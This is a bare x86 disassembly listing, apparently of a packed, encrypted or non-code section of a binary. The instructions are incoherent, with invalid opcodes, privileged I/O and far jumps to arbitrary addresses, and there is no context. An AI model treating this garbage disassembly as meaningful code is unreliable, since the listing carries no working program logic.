  41af94:	add    eax,0x3b0d3fea
  41af99:	adc    eax,0x18056d95
  41af9e:	xchg   dl,bl
  41afa0:	mov    ecx,0xdf49a9eb
  41afa5:	inc    esp
  41afa6:	das    
  41afa7:	sub    ecx,ebp
  41afa9:	enter  0x4b43,0x93
  41afad:	pop    ds
  41afae:	xchg   edx,eax
  41afaf:	inc    ecx
  41afb0:	mov    esp,0x8ba8fc61
  41afb5:	jmp    0x41b024
  41afb7:	cdq    
  41afb8:	push   ebp
  41afb9:	das    
  41afba:	aad    0x11
  41afbc:	or     ch,BYTE PTR [eax+edx*2+0x50a69d5]
  41afc3:	ret    
  41afc4:	or     edi,eax
  41afc6:	jl     0x41af9a
  41afc8:	std    
  41afc9:	dec    edx
  41afca:	sbb    DWORD PTR [ebp+0x1b],edi
  41afcd:	inc    esi
  41afce:	add    ebp,edx
  41afd0:	or     DWORD PTR [eax-0x4928860f],0xf542f0a8
  41afda:	push   ebp
  41afdb:	clc    
  41afdc:	xchg   BYTE PTR [esi+0x1f04b142],bh
  41afe2:	and    DWORD PTR [ebp-0xd],esp
  41afe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afe6:	sbb    cl,al
  41afe8:	into   
  41afe9:	sub    al,0xca
  41afeb:	sub    edx,esp
  41afed:	sbb    al,0xe9
  41afef:	push   ss
  41aff0:	arpl   WORD PTR [ebp+0x5d63d2e2],si
  41aff6:	xlat   BYTE PTR ds:[ebx]
  41aff7:	les    ebp,FWORD PTR [esp+edi*2+0x8]
  41affb:	jle    0x41b058
  41affd:	call   0xe93e:0x431609c2
  41b004:	lock adc esi,0xec4d9ecb
  41b00b:	xor    eax,0x960b0952
  41b010:	pop    eax
  41b011:	dec    edi
  41b012:	xor    edi,DWORD PTR [ecx+ecx*8-0x6e]
  41b016:	push   esp
  41b017:	cmp    BYTE PTR [edx-0x2a],0x88
  41b01b:	cdq    
  41b01c:	add    al,0x5e
  41b01e:	pcmpgtd mm4,QWORD PTR [edi+0x67]
  41b022:	loope  0x41b007
  41b024:	xor    ebx,ebx
  41b026:	add    DWORD PTR [edx-0x18],ebx
  41b029:	push   es
  41b02a:	push   esi
  41b02b:	inc    esi
  41b02c:	adc    dh,BYTE PTR [edi]
  41b02e:	leave  
  41b02f:	sbb    al,0xc4
  41b031:	sub    BYTE PTR [ebx+0x15],cl
  41b034:	leave  
  41b035:	sub    al,0x5d
  41b037:	(bad)  
  41b038:	ffree  st(3)
  41b03a:	inc    esi
  41b03b:	in     eax,dx
  41b03c:	sbb    edx,DWORD PTR [edi+ebx*4-0x313c3da]
  41b043:	sub    eax,0xaae35121
  41b048:	je     0x41aff4
  41b04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b04b:	inc    eax
  41b04c:	hlt    
  41b04d:	push   ebx
  41b04e:	mov    al,ds:0x19765a81
  41b053:	fldenv [edi+0x5e7bb95f]
  41b059:	mov    dh,0x34
  41b05b:	gs lock lahf 
  41b05e:	sub    ebp,ebp
  41b060:	xchg   esp,eax
  41b061:	lea    edi,[ebx+0x3fb64204]
  41b067:	test   ebx,ecx
  41b069:	cld    
  41b06a:	pop    ecx
  41b06b:	and    DWORD PTR ds:0x90498bc7,edx
  41b071:	gs pop eax
  41b073:	je     0x41b0dc
  41b075:	or     eax,0x653e85cf
  41b07a:	mov    ch,0x81
  41b07c:	loopne 0x41b033
  41b07e:	dec    esp
  41b07f:	in     eax,dx
  41b080:	add    eax,0xc272b33d
  41b085:	bound  edx,QWORD PTR ds:0xc492820
  41b08b:	out    dx,eax
  41b08c:	not    DWORD PTR [edx+ebx*4+0x48]
  41b090:	add    ecx,DWORD PTR [ebx+0x46b36e52]
  41b096:	dec    edi
  41b097:	xor    bl,dl
  41b099:	xor    al,0xf2
  41b09b:	sub    eax,DWORD PTR [edi-0x3f]
  41b09e:	(bad)  
  41b09f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0a0:	mov    al,0x34
  41b0a2:	add    al,0xdb
  41b0a4:	mov    edx,0xaf8322d6
  41b0a9:	adc    al,0xe1
  41b0ab:	scas   eax,DWORD PTR es:[edi]
  41b0ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0ad:	jno    0x41b084
  41b0af:	xlat   BYTE PTR ds:[ebx]
  41b0b0:	(bad)  
  41b0b2:	scas   eax,DWORD PTR es:[edi]
  41b0b3:	(bad)  
  41b0b4:	mov    dh,0x27
  41b0b6:	and    esp,DWORD PTR [ecx-0x64105acf]
  41b0bc:	adc    dl,bh
  41b0be:	out    0xf8,al
  41b0c0:	sbb    BYTE PTR [edi+0x20],ch
  41b0c3:	enter  0x9f56,0x49
  41b0c7:	ins    BYTE PTR es:[edi],dx
  41b0c8:	mov    ebx,0x6ab0e6c5
  41b0cd:	cmp    edx,DWORD PTR [ebx]
  41b0cf:	pop    edx
  41b0d0:	loop   0x41b0bf
  41b0d2:	pop    edi
  41b0d3:	mov    eax,ds:0x9bfe6676
  41b0d8:	jle    0x41b0e5
  41b0da:	mov    eax,0x98e6ed47
  41b0df:	sbb    al,0x9e
  41b0e1:	or     al,0x18
  41b0e3:	add    BYTE PTR ds:0x1707bf64,0x3a
  41b0ea:	cli    
  41b0eb:	fld    st(6)
  41b0ed:	adc    BYTE PTR [ecx+0x298f8bd0],0xeb
  41b0f4:	mov    bl,0x8e
  41b0f6:	in     al,0xb9
  41b0f8:	mov    DWORD PTR [ebx+0x2e5a82d5],edi
  41b0fe:	push   ds
  41b0ff:	pop    esp
  41b100:	scas   eax,DWORD PTR es:[edi]
  41b101:	sub    BYTE PTR [ebx+0xefdf3b4],bh
  41b107:	imul   edx,DWORD PTR [eax-0xa],0xa3ea0792
  41b10e:	dec    esi
  41b10f:	shl    DWORD PTR [esi+0x28],0x52
  41b113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b114:	push   0x75a08b71
  41b119:	push   ebp
  41b11a:	pop    eax
  41b11b:	mov    esi,0xd0339aa0
  41b120:	shl    DWORD PTR [edx],1
  41b122:	(bad)  
  41b123:	jle    0x41b0b4
  41b125:	popa   
  41b126:	gs in  al,0xc5
  41b129:	mov    esi,0x598421a7
  41b12e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b12f:	pop    esi
  41b130:	les    esi,FWORD PTR ds:0x3e70e11f
  41b136:	xchg   edi,eax
  41b137:	icebp  
  41b138:	fs cdq 
  41b13a:	pop    ecx
  41b13b:	xchg   edx,eax
  41b13c:	push   es
  41b13d:	jmp    DWORD PTR [esi+edi*4-0x229516d2]
  41b144:	push   edx
  41b145:	sub    DWORD PTR [edi-0x61],edx
  41b148:	lock dec eax
  41b14a:	or     eax,0xebed23d6
  41b14f:	daa    
  41b150:	outs   dx,BYTE PTR ds:[esi]
  41b151:	inc    esp
  41b152:	fimul  DWORD PTR [esi]
  41b154:	mov    ebp,0x4154a044
  41b159:	test   BYTE PTR [edi+0x4a],cl
  41b15c:	stos   BYTE PTR es:[edi],al
  41b15d:	inc    esp
  41b15e:	xchg   ebp,eax
  41b15f:	sub    esp,ebx
  41b161:	es into 
  41b163:	mov    esi,0x2a6805f9
  41b168:	inc    ecx
  41b169:	lods   eax,DWORD PTR ds:[esi]
  41b16a:	pop    edx
  41b16b:	xchg   esi,eax
  41b16c:	mov    al,ds:0x6068212d
  41b171:	xchg   edx,eax
  41b172:	popa   
  41b173:	fst    QWORD PTR [eax+0x1cab4582]
  41b179:	sub    esi,edi
  41b17b:	sbb    DWORD PTR [edx+0x5f],esp
  41b17e:	mov    ds:0xdf5b2b01,al
  41b183:	cs int3 
  41b185:	out    0xcc,al
  41b187:	jmp    0x56e3:0xe4dd39f9
  41b18e:	(bad)  
  41b18f:	popf   
  41b190:	je     0x41b1ac
  41b192:	jae    0x41b1c0
  41b194:	aam    0xde
  41b196:	jnp    0x41b19f
  41b198:	fiadd  WORD PTR ds:0x8b8174e8
  41b19e:	cmp    BYTE PTR cs:[esi],ah
  41b1a1:	stos   DWORD PTR es:[edi],eax
  41b1a2:	push   cs
  41b1a3:	inc    ebx
  41b1a4:	neg    BYTE PTR [ecx]
  41b1a6:	(bad)  
  41b1a7:	dec    esp
  41b1a8:	scas   al,BYTE PTR es:[edi]
  41b1a9:	call   0x3164db79
  41b1ae:	jl     0x41b1b1
  41b1b0:	fnstcw WORD PTR [edx]
  41b1b2:	in     al,dx
  41b1b3:	pop    ecx
  41b1b4:	xchg   edi,eax
  41b1b5:	mov    ds:0x133d01f7,al
  41b1ba:	pusha  
  41b1bb:	(bad)  
  41b1bc:	jmp    0x41b1fd
  41b1be:	mov    ch,0x1b
  41b1c0:	in     al,0x59
  41b1c2:	inc    edx
  41b1c3:	ret    0x9e60
  41b1c6:	adc    al,0xe1
  41b1c8:	or     al,0x23
  41b1ca:	inc    esp
  41b1cb:	pop    esi
  41b1cc:	pop    ebx
  41b1cd:	pop    es
  41b1ce:	ja     0x41b239
  41b1d0:	repnz dec edi
  41b1d2:	cld    
  41b1d3:	mov    ds:0xb11addbe,eax
  41b1d8:	shl    ah,cl
  41b1da:	popf   
  41b1db:	mov    fs,WORD PTR [eax-0x4d]
  41b1de:	(bad)  
  41b1df:	fld    DWORD PTR [esi+0x4a530124]
  41b1e5:	je     0x41b1bf
  41b1e7:	or     BYTE PTR [esi],cl
  41b1e9:	fdivr  DWORD PTR [ecx+edi*1+0x3d9bdb81]
  41b1f0:	sahf   
  41b1f1:	ror    cl,0x15
  41b1f4:	pop    ss
  41b1f5:	pop    ecx
  41b1f6:	adc    edx,esp
  41b1f8:	mov    cl,0xb
  41b1fa:	add    eax,0xca7ea602
  41b1ff:	xchg   edi,eax
  41b200:	adc    eax,0xb1e331ac
  41b205:	xor    al,0xab
  41b207:	xchg   ch,al
  41b209:	adc    ah,BYTE PTR [eax]
  41b20b:	fmul   QWORD PTR [ecx-0x1]
  41b20e:	sbb    eax,0x26e5f6e5
  41b213:	lods   eax,DWORD PTR ds:[esi]
  41b214:	mov    esi,0xd17d0334
  41b219:	jle    0x41b1f6
  41b21b:	push   ecx
  41b21c:	jno    0x41b1f4
  41b21e:	lods   eax,DWORD PTR ds:[esi]
  41b21f:	fidivr WORD PTR [edi-0x24]
  41b222:	pop    ebx
  41b223:	loope  0x41b204
  41b225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b226:	pop    eax
  41b227:	jbe    0x41b1b5
  41b229:	rol    BYTE PTR [ebx-0x6c],0xdf
  41b22d:	or     DWORD PTR [ebp-0x16a1a4e4],ebp
  41b233:	aas    
  41b234:	xor    al,0x6c
  41b236:	inc    ecx
  41b237:	cmp    ecx,eax
  41b239:	fwait
  41b23a:	shl    dl,1
  41b23c:	rcr    DWORD PTR [edx],0xde
  41b23f:	pop    es
  41b240:	cmc    
  41b241:	hlt    
  41b242:	scas   al,BYTE PTR es:[edi]
  41b243:	jo     0x41b1fc
  41b245:	push   ds
  41b246:	in     al,0xa3
  41b248:	and    DWORD PTR [ecx],ecx
  41b24a:	mov    ah,0xac
  41b24c:	retf   
  41b24d:	inc    ebx
  41b24e:	mov    ds:0x9553acb7,eax
  41b253:	inc    edx
  41b254:	rcl    DWORD PTR [ecx+0x49a7ebba],0x4e
  41b25b:	cmc    
  41b25c:	(bad)  
  41b25d:	test   al,0xff
  41b25f:	lods   eax,DWORD PTR ds:[esi]
  41b260:	sti    
  41b261:	xchg   edi,eax
  41b262:	jnp    0x41b22c
  41b264:	fisttp WORD PTR [ebp+0x3fa6586f]
  41b26a:	push   ecx
  41b26b:	mov    ebp,0x80c45e80
  41b270:	jmp    0x5df58101
  41b275:	jno    0x41b1fe
  41b277:	pop    edx
  41b278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b279:	mov    dh,0xdc
  41b27b:	nop
  41b27c:	jecxz  0x41b2d3
  41b27e:	mov    esp,0x79fad435
  41b283:	xchg   BYTE PTR [ebx-0x73],cl
  41b286:	mov    cl,0x45
  41b288:	cmp    al,0x11
  41b28a:	or     DWORD PTR [eax],ebx
  41b28c:	je     0x41b2e6
  41b28e:	or     dl,bh
  41b290:	inc    ebx
  41b291:	inc    edi
  41b292:	jno    0x41b2c5
  41b294:	dec    ebx
  41b295:	add    cl,BYTE PTR [esi-0x748e748]
  41b29b:	xchg   esi,eax
  41b29c:	push   0x67
  41b29e:	loope  0x41b2a6
  41b2a0:	rol    DWORD PTR [edx+0x52],0xd2
  41b2a4:	test   BYTE PTR [ecx],ah
  41b2a6:	lods   al,BYTE PTR ds:[esi]
  41b2a7:	adc    WORD PTR [ecx+0x41],bp
  41b2ab:	ror    BYTE PTR [esi],cl
  41b2ad:	xor    ch,bl
  41b2af:	dec    edi
  41b2b0:	sti    
  41b2b1:	jbe    0x41b257
  41b2b3:	ins    BYTE PTR es:[edi],dx
  41b2b4:	mov    DWORD PTR [esi-0x67],esi
  41b2b7:	aas    
  41b2b8:	mov    al,ds:0x973b4314
  41b2bd:	nop
  41b2be:	mov    al,ds:0xa2b9966
  41b2c3:	push   0xec596907
  41b2c8:	bound  esp,QWORD PTR [eax-0x48]
  41b2cb:	mov    esi,0xa52eadb6
  41b2d0:	inc    ebx
  41b2d1:	stc    
  41b2d2:	cmp    DWORD PTR [esi],ebx
  41b2d4:	or     ah,BYTE PTR [ebx]
  41b2d6:	sbb    esi,ebp
  41b2d8:	push   edi
  41b2d9:	jmp    0x41b326
  41b2db:	dec    edx
  41b2dc:	adc    al,0x89
  41b2de:	lods   eax,DWORD PTR ds:[esi]
  41b2df:	pusha  
  41b2e0:	sub    al,al
  41b2e2:	ret    
  41b2e3:	adc    al,cl
  41b2e5:	aaa    
  41b2e6:	icebp  
  41b2e7:	outs   dx,DWORD PTR ds:[esi]
  41b2e8:	neg    BYTE PTR [edi-0x7a5b5f24]
  41b2ee:	or     BYTE PTR [ebp-0x786b91e1],cl
  41b2f4:	repnz mov dh,0x95
  41b2f7:	xlat   BYTE PTR ds:[ebx]
  41b2f8:	mov    BYTE PTR [ebp-0x2dcca307],al
  41b2fe:	outs   dx,DWORD PTR ds:[esi]
  41b2ff:	imul   eax,ebp,0x6064aa89
  41b305:	bound  esp,QWORD PTR [ecx]
  41b307:	jmp    0x41b2fa
  41b309:	pop    ebp
  41b30a:	push   0x63
  41b30c:	in     eax,0xed
  41b30e:	hlt    
  41b30f:	out    dx,eax
  41b310:	pop    ecx
  41b311:	jnp    0x41b2e0
  41b313:	xchg   ecx,eax
  41b314:	js     0x41b313
  41b316:	sub    ebp,DWORD PTR [ebx]
  41b318:	push   eax
  41b319:	and    BYTE PTR [edi],ah
  41b31b:	cld    
  41b31c:	push   ds
  41b31d:	ss ja  0x41b33f
  41b320:	in     al,0x1f
  41b322:	inc    ecx
  41b323:	dec    ebp
  41b324:	gs repz add al,0xdd
  41b328:	jle    0x41b319
  41b32a:	jae    0x41b2f9
  41b32c:	inc    ebx
  41b32d:	dec    al
  41b32f:	sbb    esi,DWORD PTR [esi+0x2362aa54]
  41b335:	pop    edx
  41b336:	lds    ebp,FWORD PTR [eax]
  41b338:	retf   
  41b339:	enter  0x86b3,0xf
  41b33d:	out    0xaa,al
  41b33f:	hlt    
  41b340:	in     eax,dx
  41b341:	jle    0x41b2e2
  41b343:	sbb    esp,DWORD PTR [ecx+0x2e]
  41b346:	iret   
  41b347:	stc    
  41b348:	adc    DWORD PTR [ecx+0x3c659cf0],eax
  41b34e:	dec    esp
  41b34f:	jmp    0xf3bb0c03
  41b354:	jge    0x41b3bb
  41b356:	rcr    edx,0x2f
  41b359:	imul   edx,DWORD PTR [ecx+edx*1-0x52],0x682d0ccd
  41b361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b362:	(bad)  
  41b363:	xor    eax,0x5c4ec4fa
  41b368:	rcl    BYTE PTR [esi-0x5b],cl
  41b36b:	jne    0x41b35c
  41b36d:	sub    eax,0x165025da
  41b372:	mov    ch,0xe2
  41b374:	xchg   ebx,eax
  41b375:	sbb    eax,0xa99b394c
  41b37a:	call   0xb12a:0x6c137611
  41b381:	mov    ch,0xd
  41b383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b384:	inc    ecx
  41b385:	test   eax,0x9707958a
  41b38a:	ss lahf 
  41b38c:	ret    0x4c50
  41b38f:	enter  0xb3bd,0xc4
  41b393:	fst    DWORD PTR [edi*1+0x6a916b4]
  41b39a:	inc    ecx
  41b39b:	stos   BYTE PTR es:[edi],al
  41b39c:	inc    ecx
  41b39d:	dec    ebx
  41b39e:	int3   
  41b39f:	inc    edi
  41b3a0:	out    0xa4,al
  41b3a2:	sar    DWORD PTR [ebp+0xcdf6e78],cl
  41b3a8:	inc    ebx
  41b3a9:	out    0x9c,eax
  41b3ab:	and    dl,BYTE PTR [ebx]
  41b3ad:	inc    ebx
  41b3ae:	jb     0x41b334
  41b3b0:	push   0xffffffad
  41b3b2:	addr16 lahf 
  41b3b4:	retf   
  41b3b5:	xor    eax,0xdeccfc5d
  41b3ba:	sbb    BYTE PTR [ecx+0x32],0x5a
  41b3be:	pop    esi
  41b3bf:	jbe    0x41b3cf
  41b3c1:	aaa    
  41b3c2:	inc    ebx
  41b3c3:	cs js  0x41b3b1
  41b3c6:	sub    al,0xc3
  41b3c8:	ja     0x41b365
  41b3ca:	and    dh,BYTE PTR [edx]
  41b3cc:	stc    
  41b3cd:	shl    esi,0x81
  41b3d0:	jo     0x41b393
  41b3d2:	nop
  41b3d3:	pop    edi
  41b3d4:	ss jmp 0x4d2f:0x7921afee
  41b3dc:	(bad)  
  41b3dd:	clc    
  41b3de:	push   es
  41b3df:	and    DWORD PTR [eax+0x7f],esi
  41b3e2:	mov    al,BYTE PTR [ebp+0x55871921]
  41b3e8:	adc    al,0x79
  41b3ea:	ror    DWORD PTR [ebx],1
  41b3ec:	fadd   DWORD PTR [eax-0x1]
  41b3ef:	dec    esi
  41b3f0:	inc    eax
  41b3f1:	and    BYTE PTR [ecx-0x2efaf9f1],dl
  41b3f7:	sub    al,0x63
  41b3f9:	imul   edx,DWORD PTR [esi-0x1b],0xb9854afd
  41b400:	sub    bh,BYTE PTR [edx+edx*8-0x50]
  41b404:	xchg   esp,eax
  41b405:	jge    0x41b3e3
  41b407:	xor    al,0x1f
  41b409:	scas   eax,DWORD PTR es:[edi]
  41b40a:	xchg   edx,eax
  41b40b:	pop    ebp
  41b40c:	fld    QWORD PTR [ebx-0x695562d7]
  41b412:	icebp  
  41b413:	add    al,0x73
  41b415:	rcl    BYTE PTR [eax+0x2f59e2d],0xb5
  41b41c:	mov    edi,0x7c9a82f8
  41b421:	in     eax,0x1c
  41b423:	push   ds
  41b424:	cmp    al,ch
  41b426:	les    eax,FWORD PTR [ebp+0xb]
  41b429:	mov    al,0xc7
  41b42b:	pop    es
  41b42c:	sbb    ch,BYTE PTR [ecx-0x40]
  41b42f:	jmp    0xcb26:0x273bf6a2
  41b436:	in     al,dx
  41b437:	clc    
  41b438:	xchg   edx,esi
  41b43a:	sub    eax,0x8dae1784
  41b43f:	xor    cl,BYTE PTR [eax]
  41b441:	fs jle 0x41b467
  41b444:	mov    dl,0x3c
  41b446:	cmp    eax,0xd677aefe
  41b44b:	and    al,0x18
  41b44d:	(bad)  
  41b44e:	imul   ebx,edx,0x2e
  41b451:	jmp    0x163b:0x4e5b230f
  41b458:	ins    DWORD PTR es:[edi],dx
  41b459:	sti    
  41b45a:	push   es
  41b45b:	mov    dh,0xea
  41b45d:	mov    DWORD PTR [ecx+0x26aeb751],0xec77ea44
  41b467:	inc    eax
  41b468:	jno    0x41b418
  41b46a:	lea    ebp,[edx+0x6d436d67]
  41b470:	repnz xor al,0x7a
  41b473:	xor    al,0xf1
  41b475:	cmp    DWORD PTR [edx+0x2e3480b3],edx
  41b47b:	inc    ebp
  41b47c:	aam    0x0
  41b47e:	mov    esp,DWORD PTR [edx-0x4ec1f661]
  41b484:	or     ebx,ecx
  41b486:	push   cs
  41b487:	sub    al,0x23
  41b489:	mov    al,ds:0x8b831c22
  41b48e:	mov    ch,BYTE PTR [ebx-0x17]
  41b491:	ror    BYTE PTR [edi*1+0xb4ac9ca],1
  41b498:	xlat   BYTE PTR ds:[ebx]
  41b499:	shl    BYTE PTR [eax+eax*4-0x67],cl
  41b49d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b49e:	pop    esi
  41b49f:	int3   
  41b4a0:	aas    
  41b4a1:	pop    ds
  41b4a2:	test   ah,bh
  41b4a4:	inc    ebx
  41b4a5:	sbb    ah,al
  41b4a7:	push   ebp
  41b4a8:	push   esp
  41b4a9:	aad    0x55
  41b4ab:	test   BYTE PTR [eax+0x58],bh
  41b4ae:	out    0x90,al
  41b4b0:	pop    edx
  41b4b1:	mov    ebx,gs
  41b4b3:	(bad)  
  41b4b4:	leave  
  41b4b5:	sub    ecx,ecx
  41b4b7:	adc    eax,0xb9ab7177
  41b4bc:	mov    bl,0xd9
  41b4be:	int    0xa8
  41b4c0:	cdq    
  41b4c1:	lods   al,BYTE PTR ds:[esi]
  41b4c2:	int    0xfa
  41b4c4:	jns    0x41b52a
  41b4c6:	and    eax,DWORD PTR [esi]
  41b4c8:	out    dx,eax
  41b4c9:	dec    edi
  41b4ca:	inc    esi
  41b4cb:	leave  
  41b4cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4cd:	push   ecx
  41b4ce:	cmc    
  41b4cf:	xor    ebx,DWORD PTR [esi+0x5e527a83]
  41b4d5:	data16 and al,0x7e
  41b4d8:	fmul   QWORD PTR fs:[ecx+ebx*2+0xa]
  41b4dd:	jns    0x41b50c
  41b4df:	mov    edx,0x4d1d9f4c
  41b4e4:	(bad)
  41b4e8:	inc    esi
  41b4e9:	sub    DWORD PTR [edx-0x3b7e1623],0xd5976cf
  41b4f3:	outs   dx,BYTE PTR ds:[esi]
  41b4f4:	jmp    FWORD PTR [edi]
  41b4f6:	fst    st(2)
  41b4f8:	sub    eax,0xa17101d5
  41b4fd:	adc    ecx,DWORD PTR [edx+edi*1-0x6146d58c]
  41b504:	pop    eax
  41b505:	cmp    BYTE PTR [esi-0x6eefbdf0],cl
  41b50b:	out    dx,eax
  41b50c:	addr16 xchg esp,eax
  41b50e:	mov    bh,0x3f
  41b510:	and    ah,cl
  41b512:	push   ds
  41b513:	mov    ds:0xe58fde6e,al
  41b518:	sbb    eax,0x3698f5fd
  41b51d:	shl    DWORD PTR [ebx-0x38],cl
  41b520:	sub    BYTE PTR fs:[ecx+0x20],0xfe
  41b525:	or     al,0x9c
  41b527:	sub    eax,0xe229b19a
  41b52c:	call   0x84c95fee
  41b531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b532:	mov    ah,0xcc
  41b534:	mov    dh,0xa5
  41b536:	aad    0x5e
  41b538:	sub    eax,0x1c2bc0a9
  41b53d:	dec    edi
  41b53e:	dec    eax
  41b53f:	xor    bh,BYTE PTR [ebp+0x349a9d90]
  41b545:	loop   0x41b4ee
  41b547:	dec    DWORD PTR [ebx-0x19890561]
  41b54d:	push   0x71
  41b54f:	loopne 0x41b5ce
  41b551:	ror    DWORD PTR [edi+0x53],1
  41b554:	test   BYTE PTR [ebx+0x2cc4baf2],ah
  41b55a:	or     ch,BYTE PTR [eax+eax*1]
  41b55d:	dec    eax
  41b55e:	and    BYTE PTR [ebx],dl
  41b560:	in     al,0xbe
  41b562:	inc    esi
  41b563:	fcmovnu st,st(4)
  41b565:	jbe    0x41b584
  41b567:	sbb    esp,edi
  41b569:	mov    dh,0x60
  41b56b:	inc    edx
  41b56c:	add    DWORD PTR ds:0x8d8a2342,0xdf380052
  41b576:	(bad)  [ecx+eax*4]
  41b579:	and    eax,0xc5d39e7d
  41b57e:	and    al,0x9f
  41b580:	cmp    al,0x25
  41b582:	jmp    0xa2bb:0x7cfc951a
  41b589:	mov    ecx,DWORD PTR [eax+0x3]
  41b58c:	outs   dx,DWORD PTR ds:[esi]
  41b58d:	repnz push ebx
  41b58f:	xchg   ecx,eax
  41b590:	ins    BYTE PTR es:[edi],dx
  41b591:	cli    
  41b592:	inc    ebx
  41b593:	and    eax,0x522df40e
  41b598:	adc    eax,0x470c9905
  41b59d:	push   cs
  41b59e:	add    eax,0xb2c8d22
  41b5a3:	add    al,0xfa
  41b5a5:	push   edi
  41b5a6:	xchg   esi,eax
  41b5a7:	scas   al,BYTE PTR es:[edi]
  41b5a8:	std    
  41b5a9:	pop    es
  41b5aa:	push   esp
  41b5ab:	and    DWORD PTR [ebx+0x3e],ecx
  41b5ae:	adc    al,0x17
  41b5b0:	xor    eax,0xa0221db9
  41b5b5:	es sahf 
  41b5b7:	outs   dx,DWORD PTR gs:[esi]
  41b5b9:	or     eax,0x996d539a
  41b5be:	fcomp  QWORD PTR [ebx]
  41b5c0:	test   al,0x2d
  41b5c2:	in     al,0x60
  41b5c4:	pushf  
  41b5c5:	cmc    
  41b5c6:	icebp  
  41b5c7:	mov    dl,0x36
  41b5c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5ca:	mov    eax,0x4eb29e52
  41b5cf:	arpl   WORD PTR [eax],bp
  41b5d1:	jg     0x41b5ff
  41b5d3:	add    DWORD PTR [ebx+ecx*8+0x70],esp
  41b5d7:	mov    edx,0x56a85f28
  41b5dc:	inc    esp
  41b5dd:	icebp  
  41b5de:	or     eax,0xfeb925f6
  41b5e3:	jmp    0x41b623
  41b5e5:	stos   BYTE PTR es:[edi],al
  41b5e6:	addr16 into 
  41b5e8:	sahf   
  41b5e9:	out    dx,al
  41b5ea:	pop    esi
  41b5eb:	xlat   BYTE PTR ds:[ebx]
  41b5ec:	mov    ?,WORD PTR [ebp+0x53978fa9]
  41b5f2:	push   edx
  41b5f3:	test   ebx,edi
  41b5f5:	fimul  DWORD PTR [ebx-0x36]
  41b5f8:	cs dec edi
  41b5fa:	add    eax,0x9f8b5327
  41b5ff:	es stos DWORD PTR es:[edi],eax
  41b601:	mov    esp,0x2ae3a5f8
  41b606:	push   ebp
  41b607:	jbe    0x41b5f7
  41b609:	enter  0x9dfc,0x31
  41b60d:	push   cs
  41b60e:	rcl    edx,1
  41b610:	jno    0x41b5aa
  41b612:	cmp    edi,esi
  41b614:	(bad)  
  41b616:	cmc    
  41b617:	mov    ebx,0x308926aa
  41b61c:	cdq    
  41b61d:	xor    eax,0x6e891adc
  41b622:	dec    eax
  41b623:	fcos   
  41b625:	sub    DWORD PTR [eax+ebx*1],edi
  41b628:	jl     0x41b5d7
  41b62a:	mov    DWORD PTR [edi-0x63],eax
  41b62d:	add    BYTE PTR [edx],dh
  41b62f:	(bad)  [eax+0x5f6afeb5]
  41b635:	ss enter 0xfe8e,0x7d
  41b63a:	mov    edx,0x477a7111
  41b63f:	jb     0x41b630
  41b641:	pop    ds
  41b642:	jae    0x41b656
  41b644:	cdq    
  41b645:	xor    ah,BYTE PTR [edi-0xf]
  41b648:	stos   BYTE PTR es:[edi],al
  41b649:	addr16 mov dh,0x48
  41b64c:	pop    ebx
  41b64d:	out    0x67,al
  41b64f:	xchg   DWORD PTR [ebx-0x7b],edi
  41b652:	or     DWORD PTR [ebp+0x3ad5a0a0],esp
  41b658:	add    BYTE PTR [eax],dl
  41b65a:	repz fcomp QWORD PTR fs:[eax]
  41b65e:	in     al,dx
  41b65f:	(bad)  
  41b660:	mov    edx,0x25c01d61
  41b665:	pop    eax
  41b666:	lock push cs
  41b668:	and    ch,BYTE PTR [ecx]
  41b66a:	xchg   esp,eax
  41b66b:	and    BYTE PTR [edi+0x673e0ac4],0x46
  41b672:	add    eax,0x2d8a4b48
  41b677:	cmp    eax,0xfbd0f8cb
  41b67c:	jbe    0x41b6dd
  41b67e:	mov    ds:0xbbd63e7c,eax
  41b683:	fbstp  TBYTE PTR ds:0x3570fa60
  41b689:	dec    edx
  41b68a:	mov    al,0x41
  41b68c:	adc    BYTE PTR [edi-0x562897c1],ch
  41b692:	lock jmp 0x66ac:0x43982c8
  41b69a:	bound  esi,QWORD PTR [esi+0x58c447e1]
  41b6a0:	xchg   edx,eax
  41b6a1:	loopne 0x41b640
  41b6a3:	xor    BYTE PTR [ebx+0x2f],bl
  41b6a6:	and    bh,cl
  41b6a8:	aas    
  41b6a9:	cdq    
  41b6aa:	and    eax,0x5d3d333b
  41b6af:	add    ah,BYTE PTR [eax+0x5d]
  41b6b2:	xchg   esi,eax
  41b6b3:	dec    DWORD PTR fs:[si-0x6432]
  41b6b9:	sbb    BYTE PTR [ecx+0x25],bh
  41b6bc:	adc    dh,dh
  41b6be:	mov    BYTE PTR [ebp+0x18],dl
  41b6c1:	fimul  WORD PTR [ebp+0x78]
  41b6c4:	push   eax
  41b6c5:	call   0x88de:0xa6721dbc
  41b6cc:	mov    WORD PTR ds:0x34b93ef4,?
  41b6d2:	popa   
  41b6d3:	mov    edx,0xa7a052fd
  41b6d8:	in     al,0xd2
  41b6da:	add    eax,0x3fc9d023
  41b6df:	sahf   
  41b6e0:	and    DWORD PTR [edx+0x63dd752c],ebp
  41b6e6:	inc    eax
  41b6e7:	scas   eax,DWORD PTR es:[edi]
  41b6e8:	sbb    cl,BYTE PTR [eax+0x6b670d42]
  41b6ee:	push   ebx
  41b6ef:	jo     0x41b74d
  41b6f1:	cmc    
  41b6f2:	mov    ds:0x9676becb,al
  41b6f7:	in     al,0xd9
  41b6f9:	mov    ecx,0xe520f408
  41b6fe:	aaa    
  41b6ff:	xor    ch,BYTE PTR [ebp-0x6f99f07b]
  41b705:	dec    esi
  41b706:	dec    esi
  41b707:	mov    eax,ds:0x65cadc93
  41b70c:	leave  
  41b70d:	out    dx,eax
  41b70e:	jb     0x41b71a
  41b710:	xchg   ebp,eax
